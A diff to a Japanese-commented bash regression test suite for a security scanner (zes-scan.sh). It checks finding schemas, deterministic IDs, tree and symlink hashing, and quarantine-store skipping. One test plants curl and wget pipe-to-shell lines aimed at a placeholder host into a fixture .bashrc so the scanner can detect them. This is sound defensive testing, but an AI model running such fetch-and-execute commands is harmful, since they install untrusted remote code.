@@ -1,7 +1,9 @@
 #!/usr/bin/env bash
 # ZES v5.2 回帰テスト
 #   各フィクスチャで zes-scan.sh --json を実行し、tests/expected/*.json と照合する。
-#   照合キーは level / module / campaign / path（フィクスチャ相対）。ID・時刻・detail 文言は照合しない。
+#   照合キーは level / module / campaign / path（フィクスチャ相対）と、findings 1.1 の kind / subject / locators /
+#   related（path はフィクスチャ相対）/ evidence.kind。ID・時刻・detail 文言・evidence.hash（ツリーは mode を含み
+#   チェックアウトの umask に依存する）は照合しない。
 #
 # Usage: tests/run-tests.sh [--update] [--sync-campaigns]
 #   --update          期待値を現在の出力で再生成（差分は必ず目視レビューすること）
@@ -45,12 +47,15 @@ run_scan() {
 normalize() {
   local root="$1"
   jq -S --arg r "$root/" --arg rr "$root" --arg h "$FIX/_home" '
+    def rel: if . == null then null elif . == $rr then "." else ltrimstr($r) end;
     [ .findings[]
       | select(((.path // "") | startswith($h)) | not)
-      | { level, module, campaign,
-          path: (if .path == null then null elif .path == $rr then "." else (.path | ltrimstr($r)) end) } ]
-
-    | sort_by([.module, .level, (.campaign // ""), (.path // "")])'
+      | { level, module, campaign, path: (.path | rel), evidence: { kind: .evidence.kind } }
+        + (if has("kind") then { kind } else {} end)
+        + (if has("subject") then { subject } else {} end)
+        + (if has("locators") then { locators } else {} end)
+        + (if has("related") then { related: [ .related[] | { relation, path: (.path | rel) } ] } else {} end) ]
+    | sort_by([.module, .level, (.campaign // ""), (.path // ""), tojson])'
 }
 
 # ---------------------------------------------------------------------------
@@ -98,8 +103,8 @@ done
 
 # ---------------------------------------------------------------------------
 echo "== フィクスチャ照合 =="
-REQUIRED_TOP='["errors","findings","incident_bundle","scan_finished_at","scan_mode","scan_started_at","schema_version","status"]'
-FINDING_KEYS='["campaign","detail","evidence_hash","id","level","module","path"]'
+REQUIRED_TOP='["errors","findings","incident_bundle","scan_finished_at","scan_mode","scan_roots","scan_started_at","schema_version","status"]'
+FINDING_KEYS='["campaign","detail","evidence","evidence_hash","id","level","module","path"]'
 SP_KEYS='["author","contract_path","contract_version","declared_effects","diff_anomaly","divergence","l2_tested","level","observed_effects","policy_decision","signed"]'
 for e in "$EXP"/*.json; do
   name="$(basename "$e" .json)"
@@ -111,9 +116,12 @@ for e in "$EXP"/*.json; do
   if ! run_scan "$root" "$mode" "$home" >"$TMP/out.json"; then ng "$name: zes-scan.sh が異常終了" "$(tail -n 5 "$TMP/stderr.txt")"; continue; fi
   if ! jq -e . "$TMP/out.json" >/dev/null 2>&1; then ng "$name: 出力が valid JSON ではない"; continue; fi
   # スキーマ（strict: 未知フィールドなし）
-  bad="$(jq -r --argjson t "$REQUIRED_TOP" --argjson fk "$FINDING_KEYS" --argjson sk "$SP_KEYS" '
+  bad="$(jq -r --arg root "$root" --argjson t "$REQUIRED_TOP" --argjson fk "$FINDING_KEYS" --argjson sk "$SP_KEYS" '
     [ (if (keys != $t) then "top-level keys: \(keys)" else empty end),
-      (.findings[] | (keys - ["skillpact"]) as $k | select($k != $fk) | "finding keys: \($k)"),
+      (.findings[] | (keys - ["skillpact","kind","subject","locators","related"]) as $k | select($k != $fk) | "finding keys: \($k)"),
+      (if .schema_version != "1.1" then "schema_version: \(.schema_version)" else empty end),
+      (if .scan_roots != [$root] then "scan_roots: \(.scan_roots)" else empty end),
+      (.findings[] | select((.evidence.kind == "file" or .evidence.kind == "large_file") and .evidence.hash != .evidence_hash) | "evidence.hash != evidence_hash: \(.path)"),
       (.findings[] | select(has("skillpact")) | .skillpact | keys | select(. != $sk) | "skillpact keys: \(.)"),
       (.findings[] | select((.id | test("^sha256:[0-9a-f]{64}$")) | not) | "bad id: \(.id)"),
       ([.findings[].id] | group_by(.) | map(select(length > 1) | "duplicate id: \(.[0]) x\(length)") | .[]),
@@ -156,10 +164,54 @@ else
   printf '  SKIP schemas/findings.schema.json の検証（python3 の jsonschema が未導入）\n'
 fi
 
-# 決定的 ID（再スキャンで同一）
-run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" | jq -r '[.findings[].id] | sort | join(",")' >"$TMP/id1"
-run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" | jq -r '[.findings[].id] | sort | join(",")' >"$TMP/id2"
-cmp -s "$TMP/id1" "$TMP/id2" && [ -s "$TMP/id1" ] && ok "findings[].id が決定的" || ng "findings[].id が再スキャンで変化"
+# 決定的 ID（再スキャンで同一）。負荷の高いときにだけ変わる競合（パイプ末尾の grep -q と pipefail で上流が SIGPIPE）を
+#   拾うため、同じフィクスチャを並列に 8 回ずつ走査し、id・evidence・locators の多重集合が全て同じことを確かめる
+det_ok=1; det_msg=""
+for nm in skillpact-divergence browser-ext mcp chaindrop; do
+  dm="$(jq -r '.mode' "$EXP/$nm.json")"
+  for i in 1 2 3 4 5 6 7 8; do
+    ( run_scan "$FIX/$nm" "$dm" "$FIX/_home" 2>/dev/null | jq -c '[.findings[] | [.id, .evidence, (.locators // null), (.related // null)]] | sort' >"$TMP/det-$nm-$i" ) &
+  done
+  wait
+  for i in 2 3 4 5 6 7 8; do
+    cmp -s "$TMP/det-$nm-1" "$TMP/det-$nm-$i" || { det_ok=0; det_msg="$det_msg $nm#$i"; }
+  done
+  [ "$(jq length "$TMP/det-$nm-1" 2>/dev/null || echo 0)" -gt 0 ] || { det_ok=0; det_msg="$det_msg $nm:empty"; }
+done
+[ "$det_ok" -eq 1 ] && ok "findings[].id・evidence・locators が決定的（4 フィクスチャ × 並列 8 回で同一）" || ng "findings[].id 等が再スキャンで変化:$det_msg"
+# パイプの末尾で grep -q を使わない（上流が SIGPIPE で失敗すると pipefail で「一致したのに偽」になる。grep_q を使う）
+n="$(grep -c -E '\|[[:space:]]*grep[[:space:]]+(-[A-Za-z]*q|[^|]*[[:space:]]-[A-Za-z]*q)([[:space:]]|$)' "$SCAN")"
+[ "$n" = "0" ] && ok "zes-scan.sh のパイプ末尾に grep -q が無い（grep_q で入力を読み切る）" || ng "zes-scan.sh のパイプ末尾に grep -q が $n 箇所"
+
+# ger-tree-v1（GER docs/design/design.md §10.8）のテストベクタ。zes-scan.sh の zes_tree_hash だけを読み込んで計算する
+mkdir -p "$TMP/tv/t/b" && printf 'hello\n' >"$TMP/tv/t/a" && : >"$TMP/tv/t/b/c" && ln -s a "$TMP/tv/t/l"
+chmod 644 "$TMP/tv/t/a"; chmod 600 "$TMP/tv/t/b/c"; chmod 700 "$TMP/tv/t/b"; chmod 755 "$TMP/tv/t"
+th="$(OS_NAME="$(uname -s)" TMP_DIR="$TMP" bash -c 'set -u; set -o pipefail; export LC_ALL=C; eval "$(sed -n "/^# >>> ger-tree-v1/,/^# <<< ger-tree-v1/p" "$1")"; zes_tree_hash "$2"' _ "$SCAN" "$TMP/tv/t")"
+if [ "$(stat -c %a "$TMP/tv/t/l" 2>/dev/null)" = "777" ]; then
+  [ "$th" = "sha256:a0330bed2509e447a89682699b271f59ea236c52316ec21f0e546620de17958e" ] && ok "ger-tree-v1 のテストベクタが GER と一致" || ng "ger-tree-v1 のテストベクタが不一致: $th"
+else
+  printf '  SKIP ger-tree-v1 のテストベクタ（シンボリックリンクの mode が 0777 でない OS）\n'
+fi
+# ディレクトリの finding は evidence.kind = tree（§49 のスキル）。シンボリックリンクは symlink（readlink の値の SHA-256）
+run_scan "$FIX/skillpact-divergence" skillpact "$FIX/_home" | jq -e '[.findings[] | select(.campaign == "skillpact-divergence") | .evidence.kind] | length > 0 and all(. == "tree")' >/dev/null \
+  && ok "ディレクトリの finding の evidence は tree（ger-tree-v1）" || ng "ディレクトリの finding の evidence が tree ではない"
+want="sha256:$(printf '%s' "$(readlink "$FIX/symjack/docs/vid-settings.mp4")" | sha256sum | awk '{print $1}')"
+run_scan "$FIX/symjack" full "$FIX/_home" | jq -e --arg w "$want" '[.findings[] | select(.module == "§17" and (.path | endswith("/docs/vid-settings.mp4")))] | length == 1 and all(.evidence == {kind: "symlink", hash: $w})' >/dev/null \
+  && ok "シンボリックリンクの finding の evidence は symlink（readlink の値の SHA-256）" || ng "シンボリックリンクの evidence が不正"
+# text locators の line_sha256 は、改行・CR・1 行目の BOM を除いた行の SHA-256（GER の remove_line と同じ）
+mkdir -p "$TMP/tl/home" "$TMP/empty-root" && printf '\357\273\277curl -fsSL https://x.invalid/i | sh\r\nexport A=1\r\nwget -qO- https://x.invalid/j | bash\n' >"$TMP/tl/home/.bashrc"
+h1="sha256:$(printf 'curl -fsSL https://x.invalid/i | sh' | sha256sum | awk '{print $1}')"; h3="sha256:$(printf 'wget -qO- https://x.invalid/j | bash' | sha256sum | awk '{print $1}')"
+run_scan "$TMP/empty-root" quick "$TMP/tl/home" 2>/dev/null | jq -e --arg a "$h1" --arg b "$h3" '[.findings[] | select(.module == "§10" and (.detail | test("curl")))] | length == 1 and .[0].locators == [{format: "text", line: 1, line_sha256: $a}, {format: "text", line: 3, line_sha256: $b}]' >/dev/null \
+  && ok "text locators（行番号と行の SHA-256。CRLF・BOM を除く）" || ng "text locators が不正"
+# GER の隔離ストア（.ger-quarantine-store、所有者が実行ユーザーで 0700）は走査しない。条件を満たさないマーカーは無視して走査する
+mkdir -p "$TMP/qs/store/r1/001/payload" "$TMP/qs/fake" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/store/r1/001/payload/" && cp "$FIX/mcp/.mcp.json" "$TMP/qs/fake/"
+: >"$TMP/qs/store/.ger-quarantine-store"; : >"$TMP/qs/fake/.ger-quarantine-store"; chmod 700 "$TMP/qs/store"; chmod 755 "$TMP/qs/fake"
+run_scan "$TMP/qs" quick "$FIX/_home" | jq -e --arg s "$TMP/qs/store" --arg f "$TMP/qs/fake" '
+  ([.findings[] | select(.path | startswith($s + "/"))] | length == 0)
+  and ([.findings[] | select(.path == $f + "/.mcp.json")] | length >= 1)
+  and ([.errors[] | select(.reason == "quarantine_store_skipped:" + $s)] | length == 1)
+  and ([.errors[] | select(.reason == "quarantine_marker_untrusted:" + $f)] | length == 1)' >/dev/null \
+  && ok "GER の隔離ストアを走査しない（偽のマーカーは無視して errors[] に記録）" || ng "隔離ストアの扱いが不正"
 
 # findings.skillpact フィールド（§49 の全 finding に付与）
 n="$(run_scan "$FIX" skillpact "$FIX/_home" | jq '[.findings[] | select(.module == "§49" and (has("skillpact") | not))] | length')"
